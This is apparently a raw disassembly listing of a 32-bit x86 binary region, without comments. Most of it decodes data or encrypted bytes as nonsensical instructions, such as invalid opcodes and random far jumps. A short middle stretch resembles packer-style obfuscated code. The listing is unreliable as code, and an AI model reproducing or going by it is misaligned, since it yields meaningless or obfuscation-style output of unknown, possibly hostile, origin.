  4052a1:	out    dx,eax
  4052a2:	cmp    eax,0x5c1a6033
  4052a7:	sbb    DWORD PTR [esi-0x51],edx
  4052aa:	pushf  
  4052ab:	adc    al,0x33
  4052ad:	mov    edi,0x143f6672
  4052b2:	(bad)  
  4052b3:	les    esi,FWORD PTR [ecx+0x4aecac92]
  4052b9:	and    al,0xdf
  4052bb:	push   edi
  4052bc:	jo     0x405275
  4052be:	inc    eax
  4052bf:	dec    edi
  4052c0:	loopne 0x4052c9
  4052c2:	push   ss
  4052c3:	cli    
  4052c4:	push   cs
  4052c5:	lea    ebp,[ecx+ebp*8]
  4052c8:	xchg   ebp,eax
  4052c9:	sbb    eax,DWORD PTR [edi+0x17]
  4052cc:	sahf   
  4052cd:	and    DWORD PTR [ebx-0x4c],edi
  4052d0:	mov    ds:0x46030cd8,eax
  4052d5:	inc    ebx
  4052d6:	or     bl,al
  4052d8:	rol    BYTE PTR [esi+0x72],0xbd
  4052dc:	dec    edx
  4052dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052df:	push   eax
  4052e0:	pop    es
  4052e1:	xor    eax,0xe174975f
  4052e6:	inc    edx
  4052e7:	fldenv [esi-0x69]
  4052ea:	call   0xc7f3:0xc203c880
  4052f1:	fisub  DWORD PTR [ebx]
  4052f3:	loope  0x4052a2
  4052f5:	sub    cl,BYTE PTR ds:0xc34b9ff3
  4052fb:	xchg   ebx,eax
  4052fc:	lea    ebx,[esi+eiz*1+0x2e4e59be]
  405303:	sub    eax,0x8b72a8cc
  405308:	ja     0x405389
  40530a:	adc    al,cl
  40530c:	outs   dx,BYTE PTR ds:[esi]
  40530d:	adc    edi,DWORD PTR [eax]
  40530f:	cmp    ebx,DWORD PTR [esi-0x67]
  405312:	inc    edx
  405313:	popf   
  405314:	mov    esi,0xa14821b8
  405319:	inc    edi
  40531a:	scas   eax,DWORD PTR es:[edi]
  40531b:	je     0x40538a
  40531d:	(bad)  
  40531f:	xchg   esi,eax
  405320:	add    al,0x23
  405322:	mov    ds:0x79a344ea,al
  405327:	xchg   ebp,eax
  405328:	add    eax,0x177b98a5
  40532d:	sub    DWORD PTR [ebx+0x1d009500],ecx
  405333:	dec    ecx
  405334:	xlat   BYTE PTR ds:[ebx]
  405335:	lds    edx,FWORD PTR [ebp+0x5d]
  405338:	jb     0x405385
  40533a:	cmc    
  40533b:	inc    esi
  40533c:	and    al,0x52
  40533f:	xlat   BYTE PTR ds:[ebx]
  405340:	mov    ch,0xaa
  405342:	jo     0x4052ff
  405344:	fld    DWORD PTR [edi+0x57]
  405347:	mov    bh,0x31
  405349:	in     eax,dx
  40534a:	inc    edi
  40534b:	outs   dx,BYTE PTR ds:[esi]
  40534c:	mov    gs,WORD PTR [esi-0x222f456c]
  405352:	test   DWORD PTR [edx+ecx*1-0x43],edi
  405356:	lock imul ebx,ecx,0x2c
  40535a:	pop    eax
  40535b:	xchg   ebx,eax
  40535c:	inc    ebp
  40535d:	psllq  mm2,0x50
  405361:	call   0x11714d07
  405366:	cmp    al,0x76
  405368:	push   esi
  405369:	loope  0x4053e5
  40536b:	and    eax,0xfc8bf6b0
  405370:	in     eax,dx
  405371:	sub    ebp,DWORD PTR [ecx]
  405373:	mov    BYTE PTR [edi+0x1],al
  405376:	mov    ebp,0x3a46e46a
  40537b:	or     ebx,ebp
  40537d:	int    0xbd
  40537f:	mov    bl,0xee
  405381:	dec    ecx
  405382:	mov    esi,0x8c0b2ec6
  405387:	inc    ecx
  405388:	daa    
  405389:	pop    eax
  40538a:	dec    edi
  40538b:	mov    esp,0xd6ef3a82
  405390:	cmp    eax,ecx
  405392:	mov    ebp,0x2f41cb39
  405397:	fnstenv [edx+edi*2]
  40539a:	push   ecx
  40539b:	lahf   
  40539c:	mov    ch,0xfa
  40539e:	push   es
  40539f:	or     edx,ebp
  4053a1:	add    ch,dl
  4053a3:	mov    ah,0x9d
  4053a5:	cmp    al,bl
  4053a7:	daa    
  4053a8:	fimul  WORD PTR [edx+0xa]
  4053ab:	rcl    DWORD PTR [ebx],1
  4053ad:	inc    esp
  4053ae:	xor    eax,0x1d79db9c
  4053b3:	mov    esi,0xc8037826
  4053b8:	xchg   esp,eax
  4053b9:	sbb    ch,BYTE PTR [ebx+edx*8-0x54aa41cf]
  4053c0:	inc    ebx
  4053c1:	inc    esi
  4053c2:	inc    eax
  4053c3:	push   edx
  4053c4:	mov    ds:0xe6150897,eax
  4053c9:	push   es
  4053ca:	enter  0xb5ef,0x7f
  4053ce:	gs push esp
  4053d0:	xchg   ebx,eax
  4053d1:	sub    eax,0x86a6168f
  4053d6:	jge    0x405408
  4053d8:	dec    esi
  4053d9:	jae    0x4053aa
  4053db:	jo     0x40540d
  4053dd:	push   es
  4053de:	jnp    0x4053fe
  4053e0:	pop    esp
  4053e1:	aas    
  4053e2:	test   al,0xad
  4053e4:	neg    dl
  4053e6:	mov    bh,0x4a
  4053e8:	fcomp  QWORD PTR [edi]
  4053ea:	inc    esp
  4053eb:	jnp    0x4053a7
  4053ed:	cld    
  4053ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053ef:	ss push esi
  4053f1:	cmp    cl,dh
  4053f3:	(bad)  [eax-0x6d]
  4053f6:	ins    BYTE PTR es:[edi],dx
  4053f7:	adc    ebx,DWORD PTR [esi-0x67]
  4053fa:	gs stos BYTE PTR es:[edi],al
  4053fc:	mov    cs:0xa5d89d80,al
  405402:	sbb    al,0xcf
  405404:	daa    
  405405:	sub    BYTE PTR [esi-0x4e4d3da4],ah
  40540b:	imul   eax,DWORD PTR [edi+0x1b],0xa64bd6e3
  405412:	add    cl,BYTE PTR [ebp+0x4f]
  405415:	and    eax,0xb5ba58a
  40541a:	ins    BYTE PTR es:[edi],dx
  40541b:	dec    ebp
  40541c:	(bad)  
  40541d:	pop    eax
  40541e:	inc    ebx
  40541f:	sub    BYTE PTR ds:0x49797140,dh
  405425:	iret   
  405426:	mov    eax,0xf54a8b95
  40542b:	rcr    BYTE PTR cs:[esi],0xe8
  40542f:	outs   dx,DWORD PTR ds:[esi]
  405430:	es (bad) 
  405433:	fidiv  WORD PTR [ebx+0x57]
  405436:	xor    ebp,edi
  405438:	ja     0x4053e0
  40543a:	pop    edi
  40543b:	add    al,0x52
  40543d:	dec    esp
  40543e:	lods   eax,DWORD PTR ds:[esi]
  40543f:	push   ecx
  405440:	sar    DWORD PTR [ecx],0xaa
  405443:	jns    0x4054c3
  405445:	lea    edx,[edx-0xf]
  405448:	mov    cs,edx
  40544a:	push   0xffffffc1
  40544c:	dec    esp
  40544d:	inc    ebx
  40544e:	imul   edx,DWORD PTR [ebp+0x4b],0x3e
  405452:	add    ecx,esi
  405454:	ss addr16 lock or edx,eax
  405459:	int3   
  40545a:	dec    esi
  40545b:	dec    ecx
  40545c:	cs mov dl,0x85
  40545f:	push   es
  405460:	scas   al,BYTE PTR es:[edi]
  405461:	jae    0x4053fa
  405463:	or     ebx,DWORD PTR [edi-0xca457b4]
  405469:	ret    
  40546a:	fcomp  QWORD PTR [ebp+0x2e002b7]
  405470:	push   DWORD PTR [ecx+edx*4-0x14]
  405474:	fistp  WORD PTR [ebx-0x7ee4b2e5]
  40547a:	(bad)  
  40547b:	cmp    BYTE PTR [edi],ch
  40547d:	mov    BYTE PTR [ebx+ebx*2-0x16df4ba],0xea
  405485:	aas    
  405486:	mov    WORD PTR [ecx+0x39d18dd4],cs
  40548c:	(bad)  
  40548e:	mov    bh,0x92
  405490:	loopne 0x405439
  405492:	shl    DWORD PTR [ecx-0x3f],cl
  405495:	scas   eax,DWORD PTR es:[edi]
  405496:	jge    0x4054bb
  405498:	inc    ebp
  405499:	icebp  
  40549a:	fadd   QWORD PTR [eax]
  40549c:	aaa    
  40549d:	sub    ecx,edi
  40549f:	add    al,0x1b
  4054a1:	add    ebp,DWORD PTR [esi]
  4054a3:	scas   eax,DWORD PTR es:[edi]
  4054a4:	push   cs
  4054a5:	cmc    
  4054a6:	fs int 0xe5
  4054a9:	and    al,0xca
  4054ab:	pop    ss
  4054ac:	mov    fs,WORD PTR [ecx-0x17d1d2f4]
  4054b2:	mov    ebp,0x78c74664
  4054b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054b9:	xor    DWORD PTR [eax+0x20fc589e],ebx
  4054bf:	fstp   TBYTE PTR [eax]
  4054c1:	push   ds
  4054c2:	jp     0x40552a
  4054c4:	fcmovb st,st(4)
  4054c6:	mov    ch,0x26
  4054c8:	cs ss aaa 
  4054cb:	fcmovb st,st(3)
  4054cd:	add    al,0x23
  4054cf:	pop    ecx
  4054d0:	mov    dl,0x13
  4054d2:	pop    esi
  4054d3:	pop    ds
  4054d4:	sub    ah,BYTE PTR [ebx-0x7d204d37]
  4054da:	jmp    0x40551d
  4054dc:	imul   edx,eax,0x49a899aa
  4054e2:	int    0x79
  4054e4:	pop    ecx
  4054e5:	fiadd  WORD PTR [esi+0x5deaccbb]
  4054eb:	adc    BYTE PTR [esi],dl
  4054ed:	call   0xb58:0x7d1b7df4
  4054f4:	cmc    
  4054f5:	fistp  DWORD PTR [edx]
  4054f7:	xor    BYTE PTR [ecx],al
  4054f9:	iret   
  4054fa:	ja     0x4054ef
  4054fc:	rcl    BYTE PTR ds:0x86d8a6da,cl
  405502:	fs push ebp
  405504:	push   ecx
  405505:	fwait
  405506:	mov    ebx,?
  405508:	das    
  405509:	in     eax,0x13
  40550b:	pop    edx
  40550c:	je     0x405585
  40550e:	sbb    esp,DWORD PTR [ebx]
  405510:	popa   
  405511:	xlat   BYTE PTR ds:[ebx]
  405512:	call   0xdce2b7
  405517:	dec    eax
  405518:	xchg   ecx,eax
  405519:	and    dl,BYTE PTR [edi-0x2fb23cce]
  40551f:	mov    bh,0x95
  405521:	mov    esi,0xdc7cc112
  405526:	popf   
  405527:	xchg   edi,eax
  405528:	nop
  405529:	mov    bh,0xcc
  40552b:	xor    ebx,DWORD PTR [edx]
  40552d:	adc    esp,edx
  40552f:	jmp    0x4055ab
  405531:	lods   eax,DWORD PTR ds:[esi]
  405532:	ins    DWORD PTR es:[edi],dx
  405533:	pop    ebp
  405534:	hlt    
  405535:	dec    ecx
  405536:	daa    
  405537:	out    dx,eax
  405538:	lods   al,BYTE PTR ds:[esi]
  405539:	stos   BYTE PTR es:[edi],al
  40553a:	ja     0x405515
  40553c:	mov    DWORD PTR [edi+eiz*1-0x27],edi
  405540:	mov    cl,0xad
  405542:	mov    ds:0x6eabe483,eax
  405547:	jae    0x40550c
  405549:	stos   BYTE PTR es:[edi],al
  40554a:	mov    cl,0x83
  40554c:	inc    eax
  40554d:	adc    al,0xe2
  40554f:	mov    eax,ds:0x1aa7af2c
  405554:	nop
  405555:	out    dx,eax
  405556:	push   edi
  405557:	xor    ecx,DWORD PTR [edi-0x147c56f0]
  40555d:	cmp    ch,BYTE PTR [esi-0x549a71a1]
  405563:	xor    eax,0xcad43f83
  405568:	jmp    0xe123114a
  40556d:	sti    
  40556e:	popf   
  40556f:	fadd   DWORD PTR [ebp-0x2c]
  405572:	jmp    0xaa653ea3
  405577:	inc    DWORD PTR [bp-0x18]
  40557b:	pop    es
  40557c:	xchg   edx,ecx
  40557e:	jl     0x405581
  405580:	mov    ecx,0x7f9f2f3f
  405585:	int3   
  405586:	inc    ebp
  405587:	call   0x67aa:0x38824ce9
  40558e:	dec    edx
  40558f:	push   es
  405590:	pop    edi
  405591:	xchg   edi,eax
  405592:	adc    bh,BYTE PTR [ebx+0x4e]
  405595:	inc    ecx
  405596:	mov    edx,0x54a96426
  40559b:	mov    eax,0xcb5cf402
  4055a0:	jno    0x4055e2
  4055a2:	test   DWORD PTR [ebp-0x28],ecx
  4055a5:	nop
  4055a6:	ins    DWORD PTR es:[edi],dx
  4055a7:	sub    eax,edx
  4055a9:	aaa    
  4055aa:	lds    ebx,FWORD PTR [esi]
  4055ac:	in     eax,dx
  4055ad:	cmp    eax,DWORD PTR ds:0x5b621ca7
  4055b3:	push   ebp
  4055b4:	imul   ecx,DWORD PTR [eax+0x290e0a38],0x2e13f352
  4055be:	mov    ds:0x3cce53fb,al
  4055c3:	out    dx,al
  4055c4:	or     DWORD PTR [edx],esi
  4055c6:	pop    esi
  4055c7:	dec    esi
  4055c8:	mul    DWORD PTR [ecx-0x69]
  4055cb:	clc    
  4055cc:	adc    ecx,DWORD PTR [ebx+ebp*8-0x24add831]
  4055d3:	xor    DWORD PTR [edx],ebp
  4055d5:	mul    DWORD PTR [ecx]
  4055d7:	jl     0x405598
  4055d9:	int    0xc9
  4055db:	dec    ebp
  4055dc:	inc    edx
  4055dd:	xchg   ebx,eax
  4055de:	jae    0x4055b4
  4055e0:	xchg   edx,eax
  4055e1:	xor    eax,0xbaceebe4
  4055e6:	out    0xab,al
  4055e8:	mov    edx,gs
  4055ea:	cmp    al,0xb4
  4055ec:	fwait
  4055ed:	mov    bh,BYTE PTR [edx-0x3c65b494]
  4055f3:	pushf  
  4055f4:	enter  0x6dc8,0x0
  4055f8:	and    eax,0x8c49f28d
  4055fd:	stos   BYTE PTR es:[edi],al
  4055fe:	int3   
  4055ff:	mov    ebx,0x805366b9
  405604:	mov    WORD PTR [edi+0x71],ds
  405607:	dec    ebp
  405608:	rcl    BYTE PTR [ebp-0x4c6306d5],cl
  40560e:	adc    DWORD PTR [eax+0x463fe6de],ebp
  405614:	jmp    DWORD PTR [ecx+0x53]
  405617:	dec    ebx
  405618:	and    edi,DWORD PTR [esi]
  40561a:	sbb    ah,BYTE PTR [eax-0x7507389]
  405620:	inc    ebx
  405621:	lods   eax,DWORD PTR ds:[esi]
  405622:	ficom  WORD PTR [eax]
  405624:	stos   BYTE PTR es:[edi],al
  405625:	test   BYTE PTR [edx+0x45],dl
  405628:	pop    ebp
  405629:	mov    bh,BYTE PTR [ebx]
  40562b:	imul   ebx,DWORD PTR [ecx+0xa],0xa72beea5
  405632:	shr    dh,0x85
  405635:	ds jo  0x405662
  405638:	imul   eax,DWORD PTR [ecx+eiz*1],0x5930e192
  40563f:	ja     0x4056b4
  405641:	cmp    eax,0x5fe82f13
  405646:	rcr    BYTE PTR [esi],1
  405648:	and    DWORD PTR ds:0x71a159b2,ebx
  40564e:	not    BYTE PTR [ebx+edx*2-0x108308fc]
  405655:	jle    0x4055ee
  405657:	xor    DWORD PTR [eax+0x24],ebx
  40565a:	sub    cl,BYTE PTR [eax-0x39]
  40565d:	repnz xor dl,cl
  405660:	push   ss
  405661:	mov    ecx,0x33cb0b15
  405666:	xlat   BYTE PTR ds:[ebx]
  405667:	jmp    0x9f0e75f5
  40566c:	mov    ah,0x26
  40566e:	and    DWORD PTR [ecx],ebp
  405670:	popf   
  405671:	frstor [ecx]
  405673:	sbb    cl,BYTE PTR [esi]
  405675:	ror    DWORD PTR [eax],cl
  405677:	cmp    DWORD PTR [ecx],0x24
  40567a:	push   ebx
  40567b:	aad    0x3d
  40567d:	imul   esi,DWORD PTR ds:0x61d1dc2e,0x5685fa8b
  405687:	or     eax,0x552b6267
  40568c:	pop    ecx
  40568d:	xchg   BYTE PTR [eax+0x4a4f667f],dl
  405693:	ret    
  405694:	jae    0x405644
  405696:	dec    ecx
  405697:	sub    esi,esp
  405699:	retf   
  40569a:	out    0x4a,eax
  40569c:	pop    edx
  40569d:	add    edx,DWORD PTR [edi-0x57a36538]
  4056a3:	push   eax
  4056a4:	mov    ebx,0x7e036da0
  4056a9:	ror    BYTE PTR [eax],cl
  4056ab:	dec    ebp
  4056ac:	stos   DWORD PTR es:[edi],eax
  4056ad:	rcr    esi,1
  4056af:	sahf   
  4056b0:	stc    
  4056b1:	mov    dh,0xa7
  4056b3:	xchg   dh,al
  4056b5:	sbb    ch,BYTE PTR [ebp-0x37d67d53]
  4056bb:	mov    al,ds:0xafce6a04
  4056c0:	int3   
  4056c1:	push   ds
  4056c2:	jb     0x405648
  4056c4:	dec    esp
  4056c5:	xchg   esp,eax
  4056c6:	sbb    esi,DWORD PTR [ecx-0x3757269b]
  4056cc:	stos   BYTE PTR es:[edi],al
  4056cd:	mov    ah,0xfe
  4056cf:	inc    ebx
  4056d0:	inc    eax
  4056d1:	jmp    0x49921ec2
  4056d6:	daa    
  4056d7:	fnsave [esi-0x7b414fec]
  4056dd:	push   0x28
  4056df:	mov    dh,0x63
  4056e1:	or     edx,DWORD PTR cs:[edi+0x7a3cb599]
  4056e8:	stos   BYTE PTR es:[edi],al
  4056e9:	into   
  4056ea:	inc    esi
  4056eb:	aas    
  4056ec:	xor    eax,0x88fd0614
  4056f1:	shr    BYTE PTR [ebp+0x53],0x5a
  4056f5:	das    
  4056f6:	pop    edx
  4056f7:	rol    BYTE PTR [ebx-0x13614342],1
  4056fd:	mov    cl,0x3d
  4056ff:	pushf  
  405700:	xchg   ecx,eax
  405701:	mov    bl,0xc2
  405703:	mov    edx,esi
  405705:	adc    dl,BYTE PTR [ebx+0x6e]
  405708:	jle    0x4056c0
  40570a:	stos   BYTE PTR es:[edi],al
  40570b:	mov    esi,0x1ee1c184
  405710:	lea    ecx,[edx+eax*1]
  405713:	mov    eax,DWORD PTR [ebx]
  405715:	movzx  edx,WORD PTR ds:0x4228ca
  40571c:	or     edx,DWORD PTR ds:0x4229ae
  405722:	mov    DWORD PTR ds:0x4228ca,edx
  405728:	mov    edx,DWORD PTR [ebx+0x4]
  40572b:	sub    DWORD PTR ds:0x4228de,0x42296a
  405735:	shrd   eax,edx,0x2
  405739:	shr    edx,0x2
  40573c:	cmp    DWORD PTR ds:0x422936,0x0
  405743:	mov    DWORD PTR ds:0x42296a,edx
  405749:	mov    DWORD PTR ds:0x4229ca,0x5a5b
  405753:	mov    DWORD PTR ds:0x422952,0x59ac
  40575d:	jmp    0x4057b9
  405762:	not    edx
  405764:	mov    edx,DWORD PTR ds:0x4228aa
  40576a:	jbe    0x4057a1
  405770:	push   0x1
  405772:	push   0x68d9
  405777:	call   DWORD PTR ds:0x42a29c
  40577d:	mov    edx,DWORD PTR ds:0x4229ce
  405783:	add    DWORD PTR ds:0x422922,edx
  405789:	xor    edx,edx
  40578b:	or     edx,DWORD PTR ds:0x422926
  405791:	add    DWORD PTR ds:0x42297a,edx
  405797:	or     DWORD PTR ds:0x4228d6,0x1005
  4057a1:	add    DWORD PTR ds:0x4228ae,ecx
  4057a7:	mov    DWORD PTR ds:0x422912,0x7731
  4057b1:	add    edx,0x5dfe
  4057b7:	not    edx
  4057b9:	mov    DWORD PTR [ebp-0x1c],eax
  4057bc:	mov    edx,DWORD PTR ds:0x422982
  4057c2:	or     DWORD PTR ds:0x4228c2,edx
  4057c8:	mov    eax,DWORD PTR [ebx]
  4057ca:	jmp    0x405d54
  4057cf:	loope  0x405800
  4057d1:	adc    eax,0x58a019aa
  4057d6:	adc    al,0x1b
  4057d8:	push   ds
  4057d9:	fsubr  DWORD PTR [eax-0x57f0dcd3]
  4057df:	adc    DWORD PTR [ecx+0x43d1616],esp
  4057e5:	push   ss
  4057e6:	push   ss
  4057e7:	popa   
  4057e8:	mov    DWORD PTR [eax],ebp
  4057ea:	adc    eax,0x2e41d8f8
  4057ef:	or     eax,0xf20aafae
  4057f4:	in     al,dx
  4057f5:	push   edi
  4057f6:	mov    edi,0x12742a71
  4057fb:	push   es
  4057fc:	mov    dh,0x8d
  4057fe:	cmp    al,0xfa
  405800:	mov    al,0xcd
  405802:	xchg   ebx,edi
  405804:	push   0x96f8af96
  405809:	ja     0x405847
  40580b:	mov    al,0xf9
  40580d:	clc    
  40580e:	push   edx
  40580f:	xor    al,0xb5
  405811:	pop    ds
  405812:	inc    edi
  405813:	xor    eax,0xfbbec889
  405818:	add    DWORD PTR ds:0xaae7be9d,eax
  40581e:	imul   ebx,esp,0x17d661ae
  405824:	add    al,0x5c
  405826:	arpl   WORD PTR [esi-0x7e],di
  405829:	xchg   BYTE PTR [esp+edi*4],cl
  40582c:	dec    edx
  40582d:	aad    0x59
  40582f:	xchg   esp,eax
  405830:	daa    
  405831:	imul   ebx,DWORD PTR [ebx+0x35b1da94],0x403d21e5
  40583b:	(bad)  
  40583c:	mov    ebp,0x91b32c33
  405841:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405842:	jg     0x405809
  405844:	enter  0x45b4,0x8a
  405848:	das    
  405849:	mov    cl,0x1a
  40584b:	push   ecx
  40584c:	out    0xe5,eax
  40584e:	dec    ebx
  40584f:	xchg   al,bh
  405851:	call   0x582d:0xd8e22a7
  405858:	aam    0x69
  40585a:	inc    esp
  40585b:	add    al,0x97
  40585d:	ins    DWORD PTR es:[di],dx
  40585f:	xchg   esp,eax
  405860:	stos   DWORD PTR es:[edi],eax
  405861:	xchg   ebx,eax
  405862:	mov    ebp,0x4c4bc6fc
  405867:	adc    ch,BYTE PTR [esi]
  405869:	je     0x40588c
  40586b:	mov    DWORD PTR [ecx-0x42],ebp
  40586e:	sbb    DWORD PTR [esi-0x1e],0xcc192ef3
  405875:	lods   eax,DWORD PTR ds:[esi]
  405876:	push   es
  405877:	inc    eax
  405878:	ins    DWORD PTR es:[edi],dx
  405879:	mov    eax,ds:0xb5cca5e2
  40587e:	and    DWORD PTR [edx],esp
  405880:	lods   al,BYTE PTR ds:[esi]
  405881:	pop    DWORD PTR [eax+0x9088012]
  405887:	loopne 0x405813
  405889:	shl    DWORD PTR [edx+0x3c],cl
  40588c:	pop    ss
  40588d:	aaa    
  40588e:	js     0x40581b
  405890:	je     0x40588b
  405892:	in     eax,dx
  405893:	cmp    esp,DWORD PTR [ebp+0x7b56163]
  405899:	push   ss
  40589a:	add    DWORD PTR [ecx-0x1d],esi
  40589d:	and    al,BYTE PTR [edi-0x78]
  4058a0:	sub    bh,BYTE PTR [edx]
  4058a2:	jg     0x405892
  4058a4:	es push eax
  4058a6:	neg    BYTE PTR [esp+ebp*1-0x747b10cf]
  4058ad:	in     eax,0xeb
  4058af:	xchg   esi,eax
  4058b0:	pushf  
  4058b1:	ror    BYTE PTR [eax],1
  4058b3:	scas   eax,DWORD PTR es:[edi]
  4058b4:	or     DWORD PTR [edx],ecx
  4058b6:	mov    dh,dl
  4058b8:	inc    ebx
  4058b9:	into   
  4058ba:	and    eax,0xd573d114
  4058bf:	nop
  4058c0:	jecxz  0x405893
  4058c2:	jno    0x4058ad
  4058c4:	mov    ebx,0x43ca073
  4058c9:	and    bh,BYTE PTR [edx-0x28]
  4058cc:	push   edi
  4058cd:	std    
  4058ce:	sub    DWORD PTR [eax-0x5fafef4a],0x77
  4058d5:	or     DWORD PTR [esi],eax
  4058d7:	cmp    cl,BYTE PTR [eax+0x29]
  4058da:	inc    esi
  4058db:	pop    edx
  4058dc:	push   0x2b46d197
  4058e1:	and    bh,BYTE PTR [eax]
  4058e3:	jne    0x405940
  4058e5:	cmp    eax,0x35f15ebe
  4058ea:	xor    al,0x84
  4058ec:	in     al,0x10
  4058ee:	fwait
  4058ef:	dec    ebx
  4058f0:	enter  0xa219,0x62
  4058f4:	rcr    DWORD PTR [eax-0x6f155d26],1
  4058fa:	sbb    eax,0x1a0d0b5f
  4058ff:	out    dx,eax
  405900:	ret    0xf04e
  405903:	cmp    BYTE PTR [esi],dh
  405905:	inc    eax
  405906:	rcr    DWORD PTR [ebp-0x711b0eb6],1
  40590c:	jmp    DWORD PTR [esi]
  40590e:	mov    bh,0x85
  405910:	cdq    
  405911:	jge    0x40595b
  405913:	call   0x9b2c06
  405918:	ret    0xe72b
  40591b:	inc    ebx
  40591c:	pop    ebx
  40591d:	cdq    
  40591e:	or     DWORD PTR ds:0x83277282,eax
  405924:	dec    ebx
  405925:	mov    ch,0x5c
  405927:	in     eax,0x87
  405929:	adc    al,0xc7
  40592b:	and    BYTE PTR [ebp-0x6e],dh
  40592e:	in     al,dx
  40592f:	rcr    DWORD PTR [ecx+0x543e1e19],cl
  405935:	clc    
  405936:	and    BYTE PTR [edx-0xb],ah
  405939:	pop    ss
  40593a:	jle    0x405959
  40593c:	outs   dx,DWORD PTR ds:[esi]
  40593d:	scas   eax,DWORD PTR es:[edi]
  40593e:	fidiv  WORD PTR [ebx-0x62]
  405941:	or     BYTE PTR [ebx+0x4de2d640],bl
  405947:	push   ebx
  405948:	ins    DWORD PTR es:[edi],dx
  405949:	push   cs
  40594a:	jno    0x405963
  40594c:	add    cl,0xbd
  40594f:	xor    esi,esi
  405951:	pop    eax
  405952:	(bad)  
  405954:	outs   dx,BYTE PTR ds:[esi]
  405955:	push   edi
  405956:	push   ss
  405957:	jns    0x10cca66a
  40595d:	call   0xfbe0b8dd
  405962:	shl    BYTE PTR [ecx-0x42587e34],cl
  405968:	iret   
  405969:	test   al,0xfe
  40596b:	sub    al,0xfa
  40596d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40596e:	pusha  
  40596f:	xchg   esp,eax
  405970:	cmp    bl,BYTE PTR [ebx-0x13]
  405973:	push   esi
  405974:	hlt    
  405975:	(bad)  
  405976:	or     BYTE PTR [ebp+0x7f0ff440],ch
  40597c:	add    al,0x8
  40597e:	retf   
  40597f:	enter  0xadb0,0x52
  405983:	rcr    BYTE PTR [ecx-0x1003dffc],cl
  405989:	aad    0xc3
  40598b:	stos   DWORD PTR es:[edi],eax
  40598c:	mov    eax,DWORD PTR [ecx+0x5d]
  40598f:	mov    dl,0xed
  405991:	shr    BYTE PTR ds:0x18ccb39,0xb4
  405998:	sbb    al,0xd5
  40599a:	out    dx,eax
  40599b:	mov    DWORD PTR [edx+0x9],esp
  40599e:	adc    esp,DWORD PTR [edx+0xa]
  4059a1:	gs popf 
  4059a3:	push   esi
  4059a4:	adc    bh,dl
  4059a6:	imul   esp,DWORD PTR ds:0xdc19114,0xffffffc3
  4059ad:	jmp    0x9d537fa
  4059b2:	mov    bh,0x81
  4059b4:	jl     0x405a0e
  4059b6:	mov    al,ds:0xb15219c8
  4059bb:	push   eax
  4059bc:	icebp  
  4059bd:	pusha  
  4059be:	xchg   esi,eax
  4059bf:	xchg   ecx,eax
  4059c0:	(bad)  
  4059c1:	jmp    0x7aa9:0xb0856055
  4059c8:	dec    bh
  4059ca:	mov    cl,0xdf
  4059cc:	push   esi
  4059cd:	mov    ds:0xb7ee4338,eax
  4059d2:	mov    esp,0xed392969
  4059d7:	mov    ebx,0xa75f59e5
  4059dc:	fs in  eax,0x14
  4059df:	mov    ebx,0x720a29b0
  4059e4:	or     DWORD PTR [edx-0x70b2a374],ecx
  4059ea:	fst    QWORD PTR [bx]
  4059ed:	(bad)  [esi-0x56]
  4059f0:	add    DWORD PTR [ecx],edi
  4059f2:	sbb    eax,0x8be7c3e2
  4059f7:	mov    esi,0x727f4189
  4059fc:	sub    BYTE PTR [ebp+0x15],dh
  4059ff:	or     dl,BYTE PTR [esi]
  405a01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a02:	and    eax,0x9c69980a
  405a07:	xor    DWORD PTR [esi-0x23],esi
  405a0a:	sti    
  405a0b:	fwait
  405a0c:	push   ss
  405a0d:	push   ss
  405a0e:	adc    ch,cl
  405a10:	mov    ds:0xbcda5850,al
  405a15:	loope  0x405a92
  405a17:	jbe    0x4059ce
  405a19:	in     eax,0x6d
  405a1b:	push   cs
  405a1c:	push   ecx
  405a1d:	shl    DWORD PTR [ecx],0xdd
  405a20:	in     al,dx
  405a21:	rcr    DWORD PTR [eax+0x1e4b373],1
  405a27:	inc    ecx
  405a28:	pop    edi
  405a29:	xchg   ebx,eax
  405a2a:	cmp    al,0x2
  405a2c:	(bad)
  405a2f:	dec    edi
  405a30:	lock loop 0x405a6a
  405a33:	scas   al,BYTE PTR es:[edi]
  405a34:	add    al,0x8d
  405a36:	ds inc ebx
  405a38:	jne    0x405a8a
  405a3a:	in     eax,0xd
  405a3c:	and    BYTE PTR [ebp+0x1b],al
  405a3f:	iret   
  405a40:	xchg   edi,eax
  405a41:	pop    es
  405a42:	mov    ds:0x53491644,al
  405a47:	adc    al,0xdb
  405a49:	jmp    0xe0dd:0x30a302ac
  405a50:	not    DWORD PTR [edi]
  405a52:	cld    
  405a53:	sbb    BYTE PTR [edx],bh
  405a55:	aaa    
  405a56:	inc    esp
  405a57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a58:	and    eax,0x7589b35e
  405a5d:	and    eax,0x2c93ff6c
  405a62:	xchg   edi,eax
  405a63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a64:	sbb    edx,DWORD PTR [eax+esi*2-0x7e]
  405a68:	fnstcw WORD PTR ds:0xec13dace
  405a6e:	add    edi,DWORD PTR [eax]
  405a70:	in     eax,0x8c
  405a72:	pop    ebx
  405a73:	leave  
  405a74:	ret    0x1ea5
  405a77:	jae    0x405a42
  405a79:	jb     0x405a42
  405a7b:	add    dl,bh
  405a7d:	jnp    0x405a77
  405a7f:	cmp    eax,0x5311122f
  405a84:	jno    0x405a3a
  405a86:	xor    edx,DWORD PTR [esi+0x7b4900cf]
  405a8c:	mov    esi,0x98a9c6cd
  405a91:	jo     0x405aeb
  405a93:	ret    0xcdf2
  405a96:	add    al,0x91
  405a98:	jecxz  0x405a71
  405a9a:	loopne 0x405b01
  405a9c:	fwait
  405a9d:	and    al,0x30
  405a9f:	push   ds
  405aa0:	fadd   st(3),st
  405aa2:	mov    edx,0xb54ba807
  405aa7:	iret   
  405aa8:	sub    al,0x52
  405aaa:	shl    ecx,1
  405aac:	mov    bl,0x49
  405aae:	in     al,0x73
  405ab0:	outs   dx,DWORD PTR ds:[esi]
  405ab1:	xor    al,0xdb
  405ab3:	das    
  405ab4:	rol    ecx,cl
  405ab6:	pushf  
  405ab7:	cli    
  405ab8:	jns    0x405aa2
